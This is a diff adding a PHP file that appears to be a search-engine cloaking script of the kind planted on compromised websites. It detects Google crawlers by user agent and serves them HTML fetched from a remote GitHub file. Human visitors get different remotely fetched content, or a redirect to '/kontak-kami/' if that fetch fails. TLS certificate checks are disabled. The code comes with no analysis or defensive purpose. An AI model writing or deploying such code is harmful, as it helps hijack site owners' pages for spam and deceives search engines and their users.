@@ -1,0 +1,52 @@
+<?php
+function fetch_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content;
+}
+
+function is_google_bot_simple() {
+    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    $bots = array('Googlebot', 'Google-InspectionTool', 'AdsBot-Google', 'Mediapartners-Google');
+    foreach ($bots as $bot) {
+        if (stripos($ua, $bot) !== false) return true;
+    }
+    return false;
+}
+
+// --- 1. GOOGLE BOT VERSION ---
+if (is_google_bot_simple()) {
+    $google_url = "https://raw.githubusercontent.com/freyarion25/kw-lp/refs/heads/main/up-terus.txt";
+    $content = fetch_remote_content($google_url);
+
+    if ($content) {
+        header('Content-Type: text/html; charset=utf-8');
+        echo $content;
+        exit;
+    }
+}
+
+// --- 2. HUMAN VERSION ---
+// Replace the URL below with your actual human content URL
+$human_url = "https://yakiniku-99l.pages.dev/megapress/oldindex.txt";
+$human_content = fetch_remote_content($human_url);
+
+if ($human_content) {
+    header('Content-Type: text/html; charset=utf-8');
+    echo $human_content;
+    exit;
+} else {
+    // Failsafe: If remote human content fails to load, redirect to the folder
+    $current_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+    if (strpos($current_uri, '/kontak-kami/') === false) {
+        header('Location: /kontak-kami/');
+        exit;
+    }
+}
+?>
